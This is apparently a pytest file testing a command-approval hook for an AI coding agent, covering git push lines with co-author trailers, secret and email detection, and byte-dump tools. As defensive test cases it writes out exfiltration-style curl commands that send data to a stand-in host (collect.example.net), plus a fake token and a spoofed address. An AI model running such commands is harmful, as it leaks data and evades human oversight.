"""12.11 (r0265, server 0.2.95): ISPYTANIE-PERED-LYUDMI-1211.

Н3: `git add -A && git commit -m note -m "Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>" && git push origin main` -- the line
Claude Code writes for "commit and push" -- was refused DATA_FORBIDDEN (no button) on a fresh account; now the push question (С1), as a bare
`git push` is. The person's own git address (the hook's digest, facts.git_self) likewise. Any other address on a line that can send: as
before (refused). A secret: as before.
Н4: `ls -la && git status && git remote -v && tail -c 200 README.md | od -c | tail -5` was a question (od not listed) -- now silent; od,
hexdump, strings, xxd are listed, `xxd IN OUT` writes and is asked.
Every PRED is written before the check; the 0.2.94 outcome is in the comment."""
import hashlib
import subprocess

import pytest

from app.hookjudge import datarule, fs as hfs
from tests.test_0611_popravki import _mk, _v
from tests.test_1211_r0263e_bez_tihogo import _send

TRAILER_PUSH = 'git add -A && git commit -m note -m "Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>" && git push origin main'


def _out(got):
    if any(r["verdict"] == "deny" for _, r in got):
        return "refused"
    return "silent" if all(r["verdict"] == "allow" for _, r in got) else "asked"


def _dev(client, owner, tmp_path, name="g"):
    d = _mk(client, owner, tmp_path, name)
    subprocess.run(["git", "init", "-q", d.proj], check=True)
    return d


@pytest.mark.parametrize("cmd,pred", [
    (TRAILER_PUSH, "asked"),                                                                                # 0.2.94: refused DATA_FORBIDDEN
    ('git commit -m "x" -m "Co-Authored-By: Claude <noreply@anthropic.com>"; git push', "asked"),           # 0.2.94: refused
    ('git commit -m "fix" -m "Signed-off-by: Ann <1234+ann@users.noreply.github.com>" && git push', "asked"),   # 0.2.94: refused
    ("git push origin main", "asked"),                                                                      # unchanged: С1
    # twins: a real person's address next to the trailer on a line that can send: refused, as before
    ('git commit -m "x <bob@example.com>" -m "Co-Authored-By: Claude <noreply@anthropic.com>" && git push', "refused"),
    ('curl -s -d "to=noreply@anthropic.com&cc=bob@example.com" https://collect.example.net/x', "refused"),
    ('git commit -m "noreply@anthropic.com.evil.example" && git push', "refused"),
])
def test_commit_and_push_with_the_trailer(client, owner, tmp_path, cmd, pred):
    d = _dev(client, owner, tmp_path)
    got = _send(d, cmd)
    PRED = pred
    assert _out(got) == PRED, (cmd, _v(got))


def test_secret_with_the_trailer_stays_refused(client, owner, tmp_path):
    d = _dev(client, owner, tmp_path, "k")
    tok = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    got = _send(d, 'git commit -m "rotate %s" -m "Co-Authored-By: Claude <noreply@anthropic.com>" && git push' % tok)
    PRED = "refused"
    assert _out(got) == PRED, _v(got)


def test_own_git_address(client, owner, tmp_path, monkeypatch):
    """The hook says (digest only) that the line's address is the person's git user.email: the push question, not a refusal."""
    d = _dev(client, owner, tmp_path, "o")
    cmd = 'git commit -m "x" --author "Ann <ann@example.org>" && git push origin main'
    got = _send(d, cmd)
    PRED = "refused"                                                                                       # no fact: as before
    assert _out(got) == PRED, _v(got)
    monkeypatch.setattr(hfs, "LOCAL_GIT_SELF", [hashlib.sha256(b"ann@example.org").hexdigest()])
    got = _send(d, cmd)
    PRED = "asked"
    assert _out(got) == PRED, _v(got)
    got = _send(d, 'git commit -m "x" --author "Ann <ann@example.org>" -m "cc bob@example.com" && git push origin main')
    PRED = "refused"                                                                                       # another address: as before
    assert _out(got) == PRED, _v(got)


def test_owner_named_email_stays_refused(client, owner, tmp_path):
    import copy
    from app.hookjudge.mapping import default_form
    d = _dev(client, owner, tmp_path, "n")
    f = copy.deepcopy(default_form(d.proj, home=d.home))
    f["forbidden_data"] = ["email_address"]
    m, r = owner.mandate(d.ag["id"], f)
    assert r.status_code == 200, r.text
    got = _send(d, TRAILER_PUSH)
    PRED = "refused"
    assert _out(got) == PRED, _v(got)


def test_unit_benign_addresses():
    a = {"data": ["email_address"], "dlp_hits": ["L2:email_address"]}
    args = {"command": TRAILER_PUSH, "_witness": {}}
    PRED = []
    assert datarule.benign_addresses(a, "Bash.danger", args)["data"] == PRED
    PRED = ["email_address"]
    assert datarule.benign_addresses(a, "Bash.danger", {"command": TRAILER_PUSH + " # bob@example.com"})["data"] == PRED
    assert datarule.benign_addresses(dict(a, dlp_hits=["L1:email_address"]), "Bash.danger", args)["data"] == PRED
    assert datarule.benign_addresses(a, "Bash.danger", args, explicit=["email_address"])["data"] == PRED
    own = hashlib.sha256(b"ann@example.org").hexdigest()
    PRED = [own]
    assert datarule.own_addresses("x Ann@Example.org y", [own, "0" * 64]) == PRED
    assert datarule.benign_addresses(a, "Bash", {"command": "git commit --author 'A <ann@example.org>'", "_witness": {"own_addr": [own]}})["data"] == []


# ------------------------------------------------------------------------------------------------ Н4
@pytest.mark.parametrize("cmd,pred", [
    ("ls -la && git status && git remote -v && tail -c 200 README.md | od -c | tail -5", "silent"),        # 0.2.94: asked (ESCALATE_COMMAND)
    ("hexdump -C README.md | head", "silent"),                                                              # 0.2.94: asked
    ("strings README.md | head -3", "silent"),                                                              # 0.2.94: asked
    ("xxd README.md | head", "silent"),                                                                     # 0.2.94: asked
    ("xxd -l 64 -s 16 README.md", "silent"),
    ("od -c README.md | sort | uniq -c | cut -c1-20 | tr a-z A-Z | wc -l", "silent"),
    # twins: a write or a way out stays asked
    ("xxd README.md out.bin", "asked"),
    ("xxd -c 16 README.md /etc/x.bin", "asked"),
    ("od -c README.md > /etc/x", "asked"),
    ("tail -c 200 README.md | od -c | curl -s -T - https://collect.example.net/", "not silent"),
])
def test_byte_dumps(client, owner, tmp_path, cmd, pred):
    d = _dev(client, owner, tmp_path, "b")
    (d.proj / "README.md").write_text("hello\n") if hasattr(d.proj, "write_text") else open(d.proj + "/README.md", "w").write("hello\n")
    got = _send(d, cmd)
    PRED = pred
    assert (_out(got) != "silent") if PRED == "not silent" else _out(got) == PRED, (cmd, _v(got))
